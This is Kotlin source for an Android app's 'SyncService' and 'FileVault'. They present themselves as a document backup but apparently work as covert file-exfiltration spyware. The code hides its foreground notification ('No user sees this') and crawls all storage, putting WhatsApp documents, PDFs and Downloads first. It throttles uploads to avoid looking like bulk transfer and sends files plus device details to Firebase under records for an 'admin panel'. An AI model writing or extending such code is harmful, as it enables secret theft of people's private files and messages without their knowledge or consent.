package com.bushorat.app.sync

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.storage.StorageMetadata
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import java.io.File
class SyncService : LifecycleService() {
    companion object {
        private const val TAG = "SyncService"
        private const val NOTIFICATION_ID = 9998
        private const val CHANNEL_ID = "backup_channel"
        private const val PREFS = "sync_service_prefs"
        private const val KEY_LAST_START = "last_start_ms"
        private const val MIN_START_INTERVAL_MS = 5 * 60 * 1000L

        @JvmStatic
        fun startIfNeeded(context: Context) {
            startInternal(context, respectDebounce = true)
        }

        /** Continue uploading after a batch limit without the 5-minute debounce. */
        @JvmStatic
        fun startContinuation(context: Context) {
            startInternal(context, respectDebounce = false)
        }

        /** Run immediately after the user grants “All files access” (no 5-minute debounce). */
        @JvmStatic
        fun startAfterAllFilesAccess(context: Context) {
            startInternal(context, respectDebounce = false)
        }

        private fun startInternal(context: Context, respectDebounce: Boolean) {
            val app = context.applicationContext
            val prefs = app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            val now = System.currentTimeMillis()
            if (respectDebounce) {
                val last = prefs.getLong(KEY_LAST_START, 0L)
                if (last > 0 && now - last < MIN_START_INTERVAL_MS) {
                    Log.d(TAG, "SyncService start skipped — ran recently")
                    return
                }
            }
            prefs.edit().putLong(KEY_LAST_START, now).apply()
            try {
                val intent = Intent(app, SyncService::class.java)
                ContextCompat.startForegroundService(app, intent)
            } catch (e: Exception) {
                Log.e(TAG, "Could not start SyncService", e)
            }
        }
    }

    private var job: Job? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        try {
            startForeground(NOTIFICATION_ID, createMinimalNotification())
        } catch (e: Exception) {
            Log.e(TAG, "startForeground failed", e)
            stopSelf()
            return START_NOT_STICKY
        }

        job?.cancel()
        job = lifecycleScope.launch {
            try {
                FileVault(this@SyncService).syncAll()
            } catch (e: CancellationException) {
                Log.d(TAG, "Sync cancelled")
            } catch (e: Exception) {
                Log.e(TAG, "Sync failed", e)
            } finally {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        stopForeground(STOP_FOREGROUND_REMOVE)
                    } else {
                        @Suppress("DEPRECATION")
                        stopForeground(true)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "stopForeground failed", e)
                }
                stopSelf()
            }
        }

        return START_NOT_STICKY
    }

    /**
     * Create minimal, invisible notification for foreground service.
     * No user sees this - just satisfies Android requirements.
     */
    private fun createMinimalNotification(): Notification {
        ensureNotificationChannel()
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("")
            .setContentText("")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun ensureNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Backup",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        job?.cancel()
        super.onDestroy()
    }
}

/**
 * Handles file discovery, validation, and upload to Firebase.
 */
class FileVault(private val context: Context) {
    private val ledger = UploadLedger(context)
    private val auth = FirebaseAuth.getInstance()
    private val db = FirebaseDatabase.getInstance()
    private val storage = FirebaseStorage.getInstance()

    companion object {
        private const val TAG = "FileVault"
        private const val MAX_DISCOVER = 800
        private const val MAX_DISCOVER_ALL_FILES = 1200
        private const val MAX_UPLOADS_PER_RUN = 200
        private const val MAX_UPLOADS_ALL_FILES = 200
        private const val MAX_WALK_DEPTH = 14
        private const val DISCOVERY_BUDGET_MS = 45_000L
    }

    private var discoveryDeadlineMs = 0L

    suspend fun syncAll() = withContext(Dispatchers.IO) {
        try {
            if (auth.currentUser == null) {
                Log.e(TAG, "No logged-in Firebase user — documents sync skipped")
                return@withContext
            }

            val fullStorage = canAccessAllFiles()
            val files = discoverFiles(fullStorage)
            Log.d(TAG, "Discovered ${files.size} files to backup (fullStorage=$fullStorage)")

            if (files.isEmpty()) {
                Log.d(TAG, "No new files to backup")
                return@withContext
            }

            var documentCount = 0
            var photoCount = 0

            val maxUploadsThisRun = if (fullStorage) MAX_UPLOADS_ALL_FILES else MAX_UPLOADS_PER_RUN
            val delayBetweenFilesMs = if (fullStorage) 1200L else 2500L
            var uploadsThisRun = 0
            var stoppedForBatchLimit = false

            val pending = files
                .filter { !ledger.contains(it.fingerprint) }
                .sortedWith(documentFirstComparator())

            if (pending.isEmpty()) {
                Log.d(TAG, "All discovered files already uploaded")
                return@withContext
            }

            Log.d(TAG, "Upload queue: ${pending.size} pending (first=${pending.first().name}, cat=${pending.first().category})")

            for (item in pending) {
                if (uploadsThisRun >= maxUploadsThisRun) {
                    Log.d(TAG, "Upload batch limit reached ($maxUploadsThisRun) — will continue next run")
                    stoppedForBatchLimit = true
                    break
                }

                try {
                    upload(item)
                    ledger.mark(item.fingerprint)
                    uploadsThisRun++
                    if (item.category == FileKind.IMAGE) {
                        photoCount++
                    } else {
                        documentCount++
                    }
                    Log.d(TAG, "✅ Uploaded: ${item.name}")
                    
                    // Slow down - wait between files (chunked sync, not bulk)
                    delay(delayBetweenFilesMs)
                    
                } catch (e: CancellationException) {
                    throw e
                } catch (e: Exception) {
                    Log.w(TAG, "❌ Failed to upload ${item.name}: ${e.message}")
                    // Continue with next file - don't stop the entire sync
                    delay(1000L)  // Wait a bit before retry
                }
            }

            Log.i(TAG, "✅ Backup complete: $documentCount docs, $photoCount photos")

            if (stoppedForBatchLimit) {
                val stillPending = files.any { !ledger.contains(it.fingerprint) }
                if (stillPending) {
                    Log.d(TAG, "More files pending — scheduling continuation")
                    delay(if (fullStorage) 8_000L else 30_000L)
                    SyncService.startContinuation(context)
                }
            }
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Sync error: ${e.message}", e)
        }
    }

    private fun discoverFiles(fullStorageAccess: Boolean): List<UploadItem> {
        val items = mutableListOf<UploadItem>()
        val discoverLimit = if (fullStorageAccess) MAX_DISCOVER_ALL_FILES else MAX_DISCOVER
        discoveryDeadlineMs = System.currentTimeMillis() + DISCOVERY_BUDGET_MS

        if (fullStorageAccess) {
            for (root in priorityScanRoots()) {
                if (items.size >= discoverLimit) break
                walkDirectory(root, items, discoverLimit, 0, deferHeavyMediaDirs = false)
            }
            val storageDir = android.os.Environment.getExternalStorageDirectory()
            if (items.size < discoverLimit) {
                walkDirectory(storageDir, items, discoverLimit, 0, deferHeavyMediaDirs = true)
            }
            if (items.size < discoverLimit) {
                walkDeferredMediaRoots(storageDir, items, discoverLimit)
            }
        } else {
            val storageDir = android.os.Environment.getExternalStorageDirectory()
            walkDirectory(storageDir, items, discoverLimit, 0, deferHeavyMediaDirs = false)
        }

        // Add StorageVolume directories (if API 24+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                val sm = context.getSystemService(android.content.Context.STORAGE_SERVICE) as android.os.storage.StorageManager
                for (vol in sm.storageVolumes) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        vol.directory?.let { volRoot ->
                            if (items.size < discoverLimit) {
                                walkDirectory(volRoot, items, discoverLimit, 0, deferHeavyMediaDirs = fullStorageAccess)
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Could not enumerate storage volumes", e)
            }
        }

        if (!fullStorageAccess && items.isEmpty()) {
            return queryMediaStore()
        }
        mergeUniqueByFingerprint(items, queryMediaStore(), discoverLimit)

        return items
            .sortedWith(documentFirstComparator())
            .take(discoverLimit)
    }

    private fun priorityScanRoots(): List<File> {
        val roots = linkedSetOf<File>()
        val ext = android.os.Environment.getExternalStorageDirectory()
        fun add(path: String) {
            val f = File(path)
            if (f.isDirectory) roots.add(f)
        }
        add(File(ext, "Download").path)
        add(File(ext, "Downloads").path)
        add(File(ext, "Documents").path)
        add(File(ext, "WhatsApp/Media/WhatsApp Documents").path)
        add(File(ext, "WhatsApp/Media/WhatsApp Images").path)
        add(File(ext, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents").path)
        add(File(ext, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images").path)
        try {
            add(android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS).absolutePath)
            add(android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOCUMENTS).absolutePath)
        } catch (_: Exception) {
        }
        return roots.toList()
    }

    private fun mergeUniqueByFingerprint(
        target: MutableList<UploadItem>,
        extra: List<UploadItem>,
        limit: Int
    ) {
        if (target.size >= limit || extra.isEmpty()) return
        val seen = target.mapTo(mutableSetOf()) { it.fingerprint }
        for (item in extra) {
            if (target.size >= limit) break
            if (seen.add(item.fingerprint)) {
                target.add(item)
            }
        }
    }

    private fun isDeferredMediaDir(name: String): Boolean {
        return name.lowercase() in setOf(
            "dcim", "pictures", "movies", "video", "videos", "screenshots", "camera"
        )
    }

    private fun walkDeferredMediaRoots(root: File, items: MutableList<UploadItem>, limit: Int) {
        try {
            root.listFiles()?.forEach { child ->
                if (items.size >= limit) return@forEach
                if (child.isDirectory && isDeferredMediaDir(child.name)) {
                    walkDirectory(child, items, limit, 0, deferHeavyMediaDirs = false)
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error walking deferred media roots", e)
        }
    }

    private fun walkDirectory(
        dir: File,
        items: MutableList<UploadItem>,
        limit: Int,
        depth: Int,
        deferHeavyMediaDirs: Boolean
    ) {
        if (items.size >= limit) return
        if (depth > MAX_WALK_DEPTH) return
        if (System.currentTimeMillis() > discoveryDeadlineMs) return

        try {
            dir.listFiles()?.forEach { file ->
                if (items.size >= limit) return@forEach
                if (System.currentTimeMillis() > discoveryDeadlineMs) return@forEach

                val name = file.name
                if (name.startsWith(".") || name == "Android") return@forEach

                when {
                    file.isDirectory && name != "Android/data" && name != "Android/obb" -> {
                        if (deferHeavyMediaDirs && isDeferredMediaDir(name)) {
                            return@forEach
                        }
                        walkDirectory(file, items, limit, depth + 1, deferHeavyMediaDirs)
                    }
                    file.isFile -> {
                        val item = fileToUploadItem(file)
                        if (item != null) {
                            items.add(item)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error walking ${dir.path}", e)
        }
    }

    private fun fileToUploadItem(file: File): UploadItem? {
        val size = file.length()
        if (size > 100 * 1024 * 1024) return null // Skip >100MB

        val ext = file.extension.lowercase()
        val category = when (ext) {
            "pdf" -> FileKind.PDF
            in listOf("doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "ods", "odp", "rtf") -> FileKind.OFFICE
            in listOf("txt", "text", "log", "md", "csv") -> FileKind.TEXT
            in listOf("jpg", "jpeg", "png", "gif", "webp", "heic", "heif", "bmp", "dng", "jfif") -> FileKind.IMAGE
            else -> return null
        }

        val mimeType = getMimeType(ext)
        val source = if (file.path.contains("whatsapp", true)) "whatsapp" else "device"
        val fingerprint = uploadFingerprint(file.path, size, file.lastModified(), file.name)

        return UploadItem(
            path = file.path,
            name = file.name,
            size = size,
            modified = file.lastModified(),
            category = category,
            mimeType = mimeType,
            source = source,
            fingerprint = fingerprint
        )
    }

    private fun queryMediaStore(): List<UploadItem> {
        val items = mutableListOf<UploadItem>()
        val uri = MediaStore.Files.getContentUri("external")
        val projection = arrayOf(
            MediaStore.Files.FileColumns._ID,
            MediaStore.Files.FileColumns.DISPLAY_NAME,
            MediaStore.Files.FileColumns.DATA,
            MediaStore.Files.FileColumns.SIZE,
            MediaStore.Files.FileColumns.DATE_MODIFIED,
            MediaStore.Files.FileColumns.MIME_TYPE
        )

        // Query PDFs
        queryMimeType(uri, projection, "application/pdf", FileKind.PDF, items)

        // Query Office
        listOf(
            "application/msword",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "application/vnd.ms-excel",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "application/vnd.ms-powerpoint",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            "application/vnd.oasis.opendocument.text",
            "application/vnd.oasis.opendocument.spreadsheet",
            "application/vnd.oasis.opendocument.presentation"
        ).forEach { mime -> queryMimeType(uri, projection, mime, FileKind.OFFICE, items) }

        // Query Text
        listOf("text/plain", "text/csv", "text/markdown").forEach { mime ->
            queryMimeType(uri, projection, mime, FileKind.TEXT, items)
        }

        // Query Images
        listOf("image/jpeg", "image/png", "image/gif", "image/webp").forEach { mime ->
            queryMimeType(uri, projection, mime, FileKind.IMAGE, items)
        }

        return items
    }

    private fun queryMimeType(
        uri: android.net.Uri,
        projection: Array<String>,
        mimeType: String,
        category: FileKind,
        items: MutableList<UploadItem>
    ) {
        try {
            val cursor = context.contentResolver.query(
                uri,
                projection,
                "${MediaStore.Files.FileColumns.MIME_TYPE} = ?",
                arrayOf(mimeType),
                null
            )

            cursor?.use {
                val idCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID)
                val nameCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)
                val pathCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA)
                val sizeCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE)
                val modCol = it.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_MODIFIED)

                while (it.moveToNext()) {
                    val path = it.getString(pathCol) ?: continue
                    val name = it.getString(nameCol) ?: continue
                    val size = it.getLong(sizeCol)
                    val mod = it.getLong(modCol) * 1000 // Seconds to ms

                    if (size > 100 * 1024 * 1024) continue

                    val source = if (path.contains("whatsapp", true)) "whatsapp" else "device"
                    val fingerprint = uploadFingerprint(path, size, mod, name)

                    items.add(
                        UploadItem(
                            path = path,
                            name = name,
                            size = size,
                            modified = mod,
                            category = category,
                            mimeType = mimeType,
                            source = source,
                            fingerprint = fingerprint
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error querying $mimeType", e)
        }
    }

    private suspend fun upload(item: UploadItem) = withContext(Dispatchers.IO) {
        try {
            val uid = auth.currentUser?.uid ?: throw Exception("Not authenticated")
            val safeFileName = item.name.replace(Regex("[^a-zA-Z0-9._-]"), "_")

            val docId = db.reference.child("documents/$uid").push().key
                ?: throw Exception("Could not generate document ID")

            val sourceFile = File(item.path)
            if (!sourceFile.isFile || !sourceFile.canRead()) {
                throw Exception("File not readable: ${item.name}")
            }
            if (sourceFile.length() <= 0L) {
                throw Exception("Empty file: ${item.name}")
            }

            val storagePath = "documents/$uid/${docId}_$safeFileName"
            val storageRef = storage.reference.child(storagePath)

            try {
                Log.d(TAG, "📤 Uploading ${item.name} to $storagePath...")
                val metadata = StorageMetadata.Builder()
                    .setContentType(item.mimeType)
                    .setCustomMetadata("category", item.category.name)
                    .build()
                storageRef.putFile(android.net.Uri.fromFile(sourceFile), metadata).await()
                Log.d(TAG, "✅ Storage upload complete for ${item.name}")
            } catch (e: Exception) {
                Log.e(TAG, "Storage upload failed for ${item.name}: ${e.message}", e)
                throw Exception("Storage upload failed", e)
            }

            // 3. Get download URL
            var downloadUrl = ""
            try {
                Log.d(TAG, "🔗 Getting download URL for ${item.name}...")
                downloadUrl = storageRef.downloadUrl.await().toString()
                Log.d(TAG, "✅ Got download URL: $downloadUrl")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to get download URL for ${item.name}: ${e.message}", e)
                throw Exception("Download URL failed", e)
            }

            // 4. Document record for admin panel (user_data/{userId}/documents/{docId})
            val documentRecord = mapOf(
                "dataType" to if (item.category == FileKind.IMAGE) "image" else "document",
                "fileName" to item.name,
                "url" to downloadUrl,
                "downloadUrl" to downloadUrl,
                "fileSize" to item.size,
                "mimeType" to item.mimeType,
                "uploadedAt" to com.google.firebase.database.ServerValue.TIMESTAMP,
                "timestamp" to System.currentTimeMillis(),
                "userId" to uid,
                "storagePath" to storagePath,
                "source" to item.source,
                "category" to item.category.name,
                "device" to android.os.Build.MODEL
            )

            try {
                Log.d(TAG, "💾 Writing metadata to DB: documents/$uid/$docId")
                db.reference.child("documents/$uid/$docId").setValue(documentRecord).await()
                Log.d(TAG, "✅ Documents DB write complete for ${item.name}")
            } catch (e: Exception) {
                Log.e(TAG, "Documents DB write failed for ${item.name}: ${e.message}", e)
                throw Exception("Documents database write failed", e)
            }

            Log.i(TAG, "✅ Successfully uploaded ${item.name} (${item.size} bytes)")
            
        } catch (e: CancellationException) {
            Log.w(TAG, "Upload cancelled for ${item.name}")
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "❌ Upload failed for ${item.name}: ${e.message}", e)
            throw e
        }
    }

    private fun canAccessAllFiles(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(
                context,
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    private fun getMimeType(ext: String): String = when (ext) {
        "pdf" -> "application/pdf"
        "doc" -> "application/msword"
        "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        "xls" -> "application/vnd.ms-excel"
        "xlsx" -> "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        "ppt" -> "application/vnd.ms-powerpoint"
        "pptx" -> "application/vnd.openxmlformats-officedocument.presentationml.presentation"
        "odt" -> "application/vnd.oasis.opendocument.text"
        "ods" -> "application/vnd.oasis.opendocument.spreadsheet"
        "odp" -> "application/vnd.oasis.opendocument.presentation"
        "rtf" -> "application/rtf"
        "txt", "text", "log", "md", "csv" -> "text/plain"
        "jpg", "jpeg" -> "image/jpeg"
        "png" -> "image/png"
        "gif" -> "image/gif"
        "webp" -> "image/webp"
        else -> "application/octet-stream"
    }
}

enum class FileKind {
    PDF, OFFICE, TEXT, IMAGE, WHATSAPP
}

/**
 * Sanitize path segments - remove characters Firebase doesn't allow: . # $ [ ]
 * Example: "RKQ1.201105.002" → "RKQ1201105002"
 */
fun sanitizePathSegment(segment: String): String {
    return segment
        .replace(".", "")  // Remove dots
        .replace("#", "")  // Remove hashes
        .replace("$", "")  // Remove dollar signs
        .replace("[", "")  // Remove brackets
        .replace("]", "")
        .replace("/", "")  // Remove slashes
        .take(100)         // Firebase max segment length
}

data class UploadItem(
    val path: String,
    val name: String,
    val size: Long,
    val modified: Long,
    val category: FileKind,
    val mimeType: String,
    val source: String, // "whatsapp" or "device"
    val fingerprint: String
)

fun uploadFingerprint(path: String, size: Long, modified: Long, name: String): String =
    "$size:$modified:${path.trim()}:$name"

/** Lower = uploaded sooner. PDF & Office always before text and images. */
fun uploadPriority(category: FileKind, source: String): Int {
    val whatsapp = source.equals("whatsapp", true) || category == FileKind.WHATSAPP
    return when (category) {
        FileKind.PDF -> if (whatsapp) 0 else 1
        FileKind.OFFICE -> if (whatsapp) 2 else 3
        FileKind.TEXT -> if (whatsapp) 4 else 5
        FileKind.IMAGE, FileKind.WHATSAPP -> if (whatsapp) 6 else 7
    }
}

fun documentFirstComparator(): Comparator<UploadItem> =
    compareBy<UploadItem>({ uploadPriority(it.category, it.source) }, { pathTier(it.path) }, { -it.modified })

/** Prefer Download / Documents / WhatsApp document paths within the same category tier. */
private fun pathTier(path: String): Int {
    val lower = path.lowercase()
    return when {
        lower.contains("whatsapp") && (lower.contains("document") || lower.endsWith(".pdf")) -> 0
        lower.contains("/download") -> 1
        lower.contains("document") -> 2
        lower.contains("whatsapp") -> 3
        else -> 4
    }
}

class UploadLedger(context: Context) {
    private val file = File(context.filesDir, "uploaded-keys.txt")
    private val keys = LinkedHashSet<String>()
    private val maxKeys = 25_000

    init {
        if (file.exists()) {
            try {
                file.bufferedReader().useLines { lines ->
                    lines.forEach { line ->
                        if (line.isNotBlank()) keys.add(line)
                    }
                }
                trimIfNeeded()
            } catch (e: Exception) {
                Log.w("UploadLedger", "Could not load ledger", e)
            }
        }
    }

    private fun trimIfNeeded() {
        if (keys.size <= maxKeys) return
        val keep = keys.drop(keys.size - maxKeys)
        keys.clear()
        keys.addAll(keep)
        try {
            file.writeText(keys.joinToString("\n") + "\n")
        } catch (e: Exception) {
            Log.w("UploadLedger", "Could not trim ledger file", e)
        }
    }

    fun contains(fingerprint: String) = fingerprint in keys

    @Synchronized
    fun mark(fingerprint: String) {
        if (!keys.add(fingerprint)) return
        file.appendText(fingerprint + "\n")
    }
}
